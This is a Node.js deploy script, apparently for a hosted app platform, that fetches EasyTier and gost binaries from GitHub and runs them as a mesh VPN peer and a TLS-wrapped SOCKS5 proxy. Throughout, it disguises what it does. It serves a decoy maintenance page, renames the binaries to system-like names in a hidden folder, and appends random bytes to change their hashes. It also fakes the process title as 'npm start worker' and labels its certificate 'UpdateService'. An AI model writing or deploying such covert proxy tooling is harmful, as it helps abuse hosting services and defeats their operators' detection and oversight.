// deploy.js

const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const { spawn, execSync } = require('child_process');
const crypto = require('crypto');


let AdmZip;
try {
    AdmZip = require('adm-zip');
} catch (e) {
    try {
        console.log('📦 补全依赖...');
        execSync('npm install adm-zip', { stdio: 'ignore' });

        try { execSync('apk add openssl', { stdio: 'ignore' }); } catch(err) {} 
        try { execSync('apt-get update && apt-get install -y openssl', { stdio: 'ignore' }); } catch(err) {}
        AdmZip = require('adm-zip');
    } catch (e) { process.exit(1); }
}


const CONFIG = {
    ET: {
        IP: process.env.ET_SERVER_IP || '10.10.10.10',
        PEER: process.env.ET_PEER_URL || 'wss://0.0.0.0:2053',
        NET_NAME: process.env.ET_NET_NAME || 'damin',
        NET_SECRET: process.env.ET_NET_SECRET || '123456',
    },
    GOST: {
        URL: 'https://github.com/go-gost/gost/releases/download/v3.0.0-rc10/gost_3.0.0-rc10_linux_amd64.tar.gz',

        PORT: process.env.ET_SOCKS_PORT || '8015'
    },
    TEMP_DIR: path.join(__dirname, '.sys_secure')
};


function generateCert() {
    console.log('🔐 正在生成 TLS 防封证书...');
    const certPath = path.join(CONFIG.TEMP_DIR, 'cert.pem');
    const keyPath = path.join(CONFIG.TEMP_DIR, 'key.pem');
    
    try {

        execSync(`openssl req -newkey rsa:2048 -nodes -keyout "${keyPath}" -x509 -days 3650 -out "${certPath}" -subj "/C=US/O=System/CN=UpdateService"`, { stdio: 'ignore' });
        console.log('✅ 生成成功');
        return { cert: certPath, key: keyPath };
    } catch (e) {
        console.error('⚠️ 生成失败 (OpenSSL未找到?)，将尝试降级运行');
        return null;
    }
}


function startWeb() {
    const port = 7860;
    http.createServer((req, res) => {
        if (req.url === '/bg.png') {
            const imgPath = path.join(__dirname, 'bg.png');
            if (fs.existsSync(imgPath)) {
                res.writeHead(200, { 'Content-Type': 'image/png' });
                res.end(fs.readFileSync(imgPath));
                return;
            }
        }
        const htmlPath = path.join(__dirname, 'index.html');
        if (fs.existsSync(htmlPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(fs.readFileSync(htmlPath, 'utf8'));
        } else {
            res.writeHead(200); res.end('System Maintenance');
        }
    }).listen(port, '0.0.0.0', () => console.log(`🚀 服务运行于端口 ${port}`));
}


function mutateFileHash(f) { try { fs.appendFileSync(f, crypto.randomBytes(1024)); } catch (e) {} }
function setIdentity() { process.title = 'npm start worker'; }
async function download(url, dest) {
    return new Promise((res, rej) => {
        const f = fs.createWriteStream(dest);
        https.get(url, r => {
            if(r.statusCode>300 && r.statusCode<400) return download(r.headers.location, dest).then(res).catch(rej);
            r.pipe(f); f.on('finish', () => f.close(res));
        }).on('error', rej);
    });
}
function extractZip(z, d) { new AdmZip(z).extractAllTo(d, true); }
function extractTar(t, d) { execSync(`tar -xzf "${t}" -C "${d}"`); }
function find(d, n) { 
    for(const f of fs.readdirSync(d,{withFileTypes:true})) {
        const p=path.join(d,f.name);
        if(f.isDirectory()) {const r=find(p,n); if(r) return r;}
        if(f.name===n) return p;
    } return null;
}


async function main() {
    setIdentity();
    startWeb();
    
    if(fs.existsSync(CONFIG.TEMP_DIR)) fs.rmSync(CONFIG.TEMP_DIR, {recursive:true,force:true});
    fs.mkdirSync(CONFIG.TEMP_DIR);

    console.log('\n--- 🔒 启动强加模式---');

 
    const tls = generateCert();
    if (!tls) {
        console.log('❌ 无法开启，请检查环境。退出。');
        process.exit(1);
    }


    await download('https://github.com/EasyTier/EasyTier/releases/download/v2.4.5/easytier-linux-x86_64-v2.4.5.zip', path.join(CONFIG.TEMP_DIR, 'et.zip'));
    extractZip(path.join(CONFIG.TEMP_DIR, 'et.zip'), CONFIG.TEMP_DIR);
    const etBin = path.join(CONFIG.TEMP_DIR, 'sys_et');
    fs.renameSync(find(CONFIG.TEMP_DIR, 'easytier-core'), etBin);
    mutateFileHash(etBin); fs.chmodSync(etBin, '755');


    await download(CONFIG.GOST.URL, path.join(CONFIG.TEMP_DIR, 'gt.tar.gz'));
    extractTar(path.join(CONFIG.TEMP_DIR, 'gt.tar.gz'), CONFIG.TEMP_DIR);
    const gostBin = path.join(CONFIG.TEMP_DIR, 'sys_gt');
    fs.renameSync(find(CONFIG.TEMP_DIR, 'gost'), gostBin);
    mutateFileHash(gostBin); fs.chmodSync(gostBin, '755');

  
    console.log(`📡 建立中... IP: ${CONFIG.ET.IP}`);
    spawn(etBin, ['-i', CONFIG.ET.IP, '--network-name', CONFIG.ET.NET_NAME, '--network-secret', CONFIG.ET.NET_SECRET, '-p', CONFIG.ET.PEER, '-n', '0.0.0.0/0', '--no-tun'], { stdio: 'inherit' });

  
    console.log(`🔌 启动... 协议: socks5+tls 端口: ${CONFIG.GOST.PORT}`);
    
  
    const gostArgs = [
        '-L', 
        `socks5+tls://:${CONFIG.GOST.PORT}?cert=${tls.cert}&key=${tls.key}&dns=8.8.8.8:53/tcp`
    ];
    spawn(gostBin, gostArgs, { stdio: 'inherit' });

    console.log(`✅ 部署完成。`);
    setInterval(()=>{}, 3600000);
}
main();


